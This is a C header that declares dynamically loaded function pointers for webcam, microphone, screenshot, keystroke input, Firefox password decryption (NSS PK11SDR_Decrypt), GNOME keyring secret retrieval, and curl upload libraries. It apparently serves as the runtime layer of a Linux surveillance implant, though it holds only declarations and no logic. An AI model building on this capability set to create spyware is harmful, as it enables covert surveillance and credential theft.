#ifndef _RUNTIME_H
#define _RUNTIME_H

#define INIT_LIBCURL         0x00000001
#define INIT_LIBJPEG         0x00000002
#define INIT_LIBV4L2         0x00000004
#define INIT_LIBSQLITE3      0x00000008
#define INIT_LIBXI           0x00000010
#define INIT_LIBCRYPTO       0x00000020
#define INIT_LIBNSS3         0x00000040
#define INIT_LIBXSS          0x00000080
#define INIT_LIBX11          0x00000100
#define INIT_LIBGLIB         0x00000200
#define INIT_LIBGNOMEKEYRING 0x00000400
#define INIT_LIBPULSE        0x00000800
#define INIT_LIBSPEEX        0x00001000

int initlib(unsigned int lib);



/*         *\
   libcurl
\*         */

#include <curl/curl.h>

#define curl_global_init (*P_curl_global_init)
CURLcode (*P_curl_global_init)(long);

#define curl_easy_init (*P_curl_easy_init)
CURL *(*P_curl_easy_init)(void);

#define curl_slist_append (*P_curl_slist_append)
struct curl_slist *(*P_curl_slist_append)(struct curl_slist *, const char *);

#undef curl_easy_setopt
#define curl_easy_setopt (*P_curl_easy_setopt)
CURLcode (*P_curl_easy_setopt)(CURL *, CURLoption, ...);

#define curl_easy_cleanup (*P_curl_easy_cleanup)
void (*P_curl_easy_cleanup)(CURL *);

#define curl_slist_free_all (*P_curl_slist_free_all)
void (*P_curl_slist_free_all)(struct curl_slist *);

#define curl_easy_perform (*P_curl_easy_perform)
CURLcode (*P_curl_easy_perform)(CURL *);



/*         *\
   libjpeg
\*         */

#include <jpeglib.h>

#define jpeg_std_error (*P_jpeg_std_error)
struct jpeg_error_mgr *(*P_jpeg_std_error)(struct jpeg_error_mgr *);

#define jpeg_CreateCompress (*P_jpeg_CreateCompress)
void (*P_jpeg_CreateCompress)(j_compress_ptr, int, size_t);

#define jpeg_stdio_dest (*P_jpeg_stdio_dest)
void (*P_jpeg_stdio_dest)(j_compress_ptr, FILE *);

#define jpeg_set_defaults (*P_jpeg_set_defaults)
void (*P_jpeg_set_defaults)(j_compress_ptr);

#define jpeg_set_quality (*P_jpeg_set_quality)
void (*P_jpeg_set_quality)(j_compress_ptr, int, boolean);

#define jpeg_start_compress (*P_jpeg_start_compress)
void (*P_jpeg_start_compress)(j_compress_ptr, boolean);

#define jpeg_write_scanlines (*P_jpeg_write_scanlines)
JDIMENSION (*P_jpeg_write_scanlines)(j_compress_ptr, JSAMPARRAY, JDIMENSION);

#define jpeg_finish_compress (*P_jpeg_finish_compress)
void (*P_jpeg_finish_compress)(j_compress_ptr);

#define jpeg_destroy_compress (*P_jpeg_destroy_compress)
void (*P_jpeg_destroy_compress)(j_compress_ptr);



/*         *\
   libv4l2
\*         */

#include <libv4l2.h>

#define v4l2_open (*P_v4l2_open)
int (*P_v4l2_open)(const char *, int, ...);

#define v4l2_close (*P_v4l2_close)
int (*P_v4l2_close)(int);

#define v4l2_ioctl (*P_v4l2_ioctl)
int (*P_v4l2_ioctl)(int, unsigned long int, ...);

#define v4l2_mmap (*P_v4l2_mmap)
void *(*P_v4l2_mmap)(void *, size_t, int, int, int, int64_t);

#define v4l2_munmap (*P_v4l2_munmap)
int (*P_v4l2_munmap)(void *, size_t);



/*            *\
   libsqlite3
\*            */

#include <sqlite3.h>

#define sqlite3_bind_int (*P_sqlite3_bind_int)
int (*P_sqlite3_bind_int)(sqlite3_stmt *, int, int);

#define sqlite3_close (*P_sqlite3_close)
int (*P_sqlite3_close)(sqlite3 *);

#define sqlite3_column_int (*P_sqlite3_column_int)
int (*P_sqlite3_column_int)(sqlite3_stmt *, int);

#define sqlite3_column_text (*P_sqlite3_column_text)
const unsigned char *(*P_sqlite3_column_text)(sqlite3_stmt *, int);

#define sqlite3_exec (*P_sqlite3_exec)
int (*P_sqlite3_exec)(sqlite3 *, const char *, int (*)(void *, int, char **, char **), void *, char **);

#define sqlite3_finalize (*P_sqlite3_finalize)
int (*P_sqlite3_finalize)(sqlite3_stmt *);

#define sqlite3_open (*P_sqlite3_open)
int (*P_sqlite3_open)(const char *, sqlite3 **);

#define sqlite3_prepare_v2 (*P_sqlite3_prepare_v2)
int (*P_sqlite3_prepare_v2)(sqlite3 *, const char *, int, sqlite3_stmt **, const char **);

#define sqlite3_step (*P_sqlite3_step)
int (*P_sqlite3_step)(sqlite3_stmt *);



/*       *\
   libXi
\*       */

#include <X11/extensions/XInput.h>

#define XOpenDevice (*P_XOpenDevice)
XDevice *(*P_XOpenDevice)(Display *, XID);

#define XListInputDevices (*P_XListInputDevices)
XDeviceInfo *(*P_XListInputDevices)(Display *, int *);

#define XSelectExtensionEvent (*P_XSelectExtensionEvent)
int (*P_XSelectExtensionEvent)(Display *, Window, XEventClass *, int);

#define XCloseDevice (*P_XCloseDevice)
int (*P_XCloseDevice)(Display *, XDevice *);

#define XFreeDeviceList (*P_XFreeDeviceList)
void (*P_XFreeDeviceList)(XDeviceInfo *);



/*           *\
   libcrypto
\*           */

#include <openssl/bio.h>
#include <openssl/evp.h>
#include <openssl/sha.h>

#define BIO_ctrl (*P_BIO_ctrl)
long (*P_BIO_ctrl)(BIO *, int, long, void *);

#define BIO_f_cipher (*P_BIO_f_cipher)
BIO_METHOD *(*P_BIO_f_cipher)(void);

#define BIO_f_md (*P_BIO_f_md)
BIO_METHOD *(*P_BIO_f_md)(void);

#define BIO_free (*P_BIO_free)
int (*P_BIO_free)(BIO *);

#define BIO_free_all (*P_BIO_free_all)
void (*P_BIO_free_all)(BIO *);

#define BIO_gets (*P_BIO_gets)
int (*P_BIO_gets)(BIO *, char *, int);

#define BIO_new (*P_BIO_new)
BIO *(*P_BIO_new)(BIO_METHOD *);

#define BIO_new_file (*P_BIO_new_file)
BIO *(*P_BIO_new_file)(const char *, const char *);

#define BIO_new_fp (*P_BIO_new_fp)
BIO *(*P_BIO_new_fp)(FILE *, int);

#define BIO_pop (*P_BIO_pop)
BIO *(*P_BIO_pop)(BIO *);

#define BIO_printf (*P_BIO_printf)
int (*P_BIO_printf)(BIO *, const char *, ...);

#define BIO_push (*P_BIO_push)
BIO *(*P_BIO_push)(BIO *, BIO *);

#define BIO_read (*P_BIO_read)
int (*P_BIO_read)(BIO *, void *, int);

#define BIO_set_cipher (*P_BIO_set_cipher)
void (*P_BIO_set_cipher)(BIO *, const EVP_CIPHER *, unsigned char *, unsigned char *, int);

#define BIO_s_mem (*P_BIO_s_mem)
BIO_METHOD *(*P_BIO_s_mem)(void);

#define BIO_s_null (*P_BIO_s_null)
BIO_METHOD *(*P_BIO_s_null)(void);

#define BIO_write (*P_BIO_write)
int (*P_BIO_write)(BIO *, const void *, int);

#define BIO_puts (*P_BIO_puts)
int (*P_BIO_puts)(BIO *, const char *);

#define EVP_CIPHER_CTX_set_padding (*P_EVP_CIPHER_CTX_set_padding)
int (*P_EVP_CIPHER_CTX_set_padding)(EVP_CIPHER_CTX *, int);

#define EVP_get_cipherbyname (*P_EVP_get_cipherbyname)
const EVP_CIPHER *(*P_EVP_get_cipherbyname)(const char *);

#define EVP_sha1 (*P_EVP_sha1)
const EVP_MD *(*P_EVP_sha1)(void);

#define MD5 (*P_MD5)
unsigned char *(*P_MD5)(const unsigned char *, unsigned long, unsigned char *);

#define OpenSSL_add_all_ciphers (*P_OpenSSL_add_all_ciphers)
void (*P_OpenSSL_add_all_ciphers)(void);

#define RAND_pseudo_bytes (*P_RAND_pseudo_bytes)
int (*P_RAND_pseudo_bytes)(unsigned char *, int);

#define SHA1_Final (*P_SHA1_Final)
int (*P_SHA1_Final)(unsigned char *, SHA_CTX *);

#define SHA1_Init (*P_SHA1_Init)
int (*P_SHA1_Init)(SHA_CTX *);

#define SHA1_Update (*P_SHA1_Update)
int (*P_SHA1_Update)(SHA_CTX *, const void *, unsigned long);



/*         *\
   libnss3
\*         */

#include <nss/nss.h>

#define NSS_Init (*P_NSS_Init)
SECStatus (*P_NSS_Init)(const char *);

#define NSS_Shutdown (*P_NSS_Shutdown)
SECStatus (*P_NSS_Shutdown)(void);

#define NSSBase64_DecodeBuffer (*P_NSSBase64_DecodeBuffer)
SECItem *(*P_NSSBase64_DecodeBuffer)(PLArenaPool *, SECItem *, const char *, unsigned int);

#define SECITEM_ZfreeItem (*P_SECITEM_ZfreeItem)
void (*P_SECITEM_ZfreeItem)(SECItem *, PRBool);

#define PK11SDR_Decrypt (*P_PK11SDR_Decrypt)
SECStatus (*P_PK11SDR_Decrypt)(SECItem *, SECItem *, void *);



/*        *\
   libXss
\*        */

#include <X11/extensions/scrnsaver.h>

#define XScreenSaverQueryExtension (*P_XScreenSaverQueryExtension)
Bool (*P_XScreenSaverQueryExtension)(Display *, int *, int *);

#define XScreenSaverQueryInfo (*P_XScreenSaverQueryInfo)
Status (*P_XScreenSaverQueryInfo)(Display *, Drawable, XScreenSaverInfo *);



/*        *\
   libX11
\*        */

#include <X11/Xlib.h>

#define XScreenSaverQueryExtension (*P_XScreenSaverQueryExtension)
Bool (*P_XScreenSaverQueryExtension)(Display *, int *, int *);

#define XCloseDisplay (*P_XCloseDisplay)
int (*P_XCloseDisplay)(Display *);

#define XCloseIM (*P_XCloseIM)
Status (*P_XCloseIM)(XIM);

#define XCreateIC (*P_XCreateIC)
XIC (*P_XCreateIC)(XIM, ...);

#define XDestroyIC (*P_XDestroyIC)
void (*P_XDestroyIC)(XIC);

#define XFlush (*P_XFlush)
int (*P_XFlush)(Display *);

#define XFree (*P_XFree)
int (*P_XFree)(void *);

#define XGetImage (*P_XGetImage)
XImage *(*P_XGetImage)(Display *, Drawable, int, int, unsigned int, unsigned int, unsigned long, int);

#define XGetInputFocus (*P_XGetInputFocus)
int (*P_XGetInputFocus)(Display *, Window *, int *);

#define XGetWindowAttributes (*P_XGetWindowAttributes)
Status (*P_XGetWindowAttributes)(Display *, Window, XWindowAttributes *);

#define XGetWindowProperty (*P_XGetWindowProperty)
int (*P_XGetWindowProperty)(Display *, Window, Atom, long, long, Bool, Atom, Atom *, int *, unsigned long *, unsigned long *, unsigned char **);

#define XInitThreads (*P_XInitThreads)
Status (*P_XInitThreads)(void);

#define XInternAtom (*P_XInternAtom)
Atom (*P_XInternAtom)(Display *, _Xconst char *, Bool);

#define XNextEvent (*P_XNextEvent)
int (*P_XNextEvent)(Display *, XEvent *);

#define XOpenDisplay (*P_XOpenDisplay)
Display *(*P_XOpenDisplay)(_Xconst char *);

#define XOpenIM (*P_XOpenIM)
XIM (*P_XOpenIM)(Display *, struct _XrmHashBucketRec *, char *, char *);

#define XPending (*P_XPending)
int (*P_XPending)(Display *);

#define XQueryPointer (*P_XQueryPointer)
Bool (*P_XQueryPointer)(Display *, Window, Window *, Window *, int *, int *, int *, int *, unsigned int *);

#define XQueryTree (*P_XQueryTree)
Status (*P_XQueryTree)(Display *, Window, Window *, Window *, Window **, unsigned int *);

#define XSetErrorHandler (*P_XSetErrorHandler)
XErrorHandler (*P_XSetErrorHandler)(XErrorHandler);

#define XSetIOErrorHandler (*P_XSetIOErrorHandler)
XIOErrorHandler (*P_XSetIOErrorHandler)(XIOErrorHandler);

#define Xutf8LookupString (*P_Xutf8LookupString)
int (*P_Xutf8LookupString)(XIC, XKeyPressedEvent *, char *, int, KeySym *, Status *);



/*         *\
   libglib
\*         */

#include <glib.h>

#define g_list_free (*P_g_list_free)
void (*P_g_list_free)(GList *list);



/*                 *\
   libgnomekeyring
\*                 */

#include <gnome-keyring.h>

#define gnome_keyring_attribute_list_free (*P_gnome_keyring_attribute_list_free)
void (*P_gnome_keyring_attribute_list_free)(GnomeKeyringAttributeList *);

#define gnome_keyring_get_info_sync (*P_gnome_keyring_get_info_sync)
GnomeKeyringResult (*P_gnome_keyring_get_info_sync)(const char *, GnomeKeyringInfo **);

#define gnome_keyring_info_free (*P_gnome_keyring_info_free)
void (*P_gnome_keyring_info_free)(GnomeKeyringInfo *);

#define gnome_keyring_info_get_is_locked (*P_gnome_keyring_info_get_is_locked)
gboolean (*P_gnome_keyring_info_get_is_locked)(GnomeKeyringInfo *);

#define gnome_keyring_is_available (*P_gnome_keyring_is_available)
gboolean (*P_gnome_keyring_is_available)(void);

#define gnome_keyring_item_get_attributes_sync (*P_gnome_keyring_item_get_attributes_sync)
GnomeKeyringResult (*P_gnome_keyring_item_get_attributes_sync)(const char *, guint32, GnomeKeyringAttributeList **);

#define gnome_keyring_item_get_info_sync (*P_gnome_keyring_item_get_info_sync)
GnomeKeyringResult (*P_gnome_keyring_item_get_info_sync)(const char *, guint32, GnomeKeyringItemInfo **);

#define gnome_keyring_item_info_free (*P_gnome_keyring_item_info_free)
void (*P_gnome_keyring_item_info_free)(GnomeKeyringItemInfo *);

#define gnome_keyring_item_info_get_mtime (*P_gnome_keyring_item_info_get_mtime)
time_t (*P_gnome_keyring_item_info_get_mtime)(GnomeKeyringItemInfo *);

#define gnome_keyring_item_info_get_secret (*P_gnome_keyring_item_info_get_secret)
char *(*P_gnome_keyring_item_info_get_secret)(GnomeKeyringItemInfo *);

#define gnome_keyring_list_item_ids_sync (*P_gnome_keyring_list_item_ids_sync)
GnomeKeyringResult (*P_gnome_keyring_list_item_ids_sync)(const char *, GList **);

#define gnome_keyring_list_keyring_names_sync (*P_gnome_keyring_list_keyring_names_sync)
GnomeKeyringResult (*P_gnome_keyring_list_keyring_names_sync)(GList **);

#define gnome_keyring_string_list_free (*P_gnome_keyring_string_list_free)
void (*P_gnome_keyring_string_list_free)(GList *);



/*          *\
   libpulse
\*          */

#include <pulse/simple.h>

#define pa_simple_free (*P_pa_simple_free)
void (*P_pa_simple_free)(pa_simple *);

#define pa_simple_new (*P_pa_simple_new)
pa_simple *(*P_pa_simple_new)(const char *, const char *, pa_stream_direction_t, const char *, const char *, const pa_sample_spec *, const pa_channel_map *, const pa_buffer_attr *, int *);

#define pa_simple_read (*P_pa_simple_read)
int (*P_pa_simple_read)(pa_simple *, void *, size_t, int *);



/*          *\
   libspeex
\*          */

#include <speex/speex.h>

#define speex_bits_destroy (*P_speex_bits_destroy)
void (*P_speex_bits_destroy)(SpeexBits *);

#define speex_bits_init (*P_speex_bits_init)
void (*P_speex_bits_init)(SpeexBits *);

#define speex_bits_reset (*P_speex_bits_reset)
void (*P_speex_bits_reset)(SpeexBits *);

#define speex_bits_write (*P_speex_bits_write)
int (*P_speex_bits_write)(SpeexBits *, char *, int);

#define speex_encode_int (*P_speex_encode_int)
int (*P_speex_encode_int)(void *, spx_int16_t *, SpeexBits *);

#define speex_encoder_ctl (*P_speex_encoder_ctl)
int (*P_speex_encoder_ctl)(void *, int, void *);

#define speex_encoder_destroy (*P_speex_encoder_destroy)
void (*P_speex_encoder_destroy)(void *);

#define speex_encoder_init (*P_speex_encoder_init)
void *(*P_speex_encoder_init)(const SpeexMode *);

#undef speex_lib_get_mode
#define speex_lib_get_mode (*P_speex_lib_get_mode)
const SpeexMode *(*P_speex_lib_get_mode)(int);



#endif /* _RUNTIME_H */
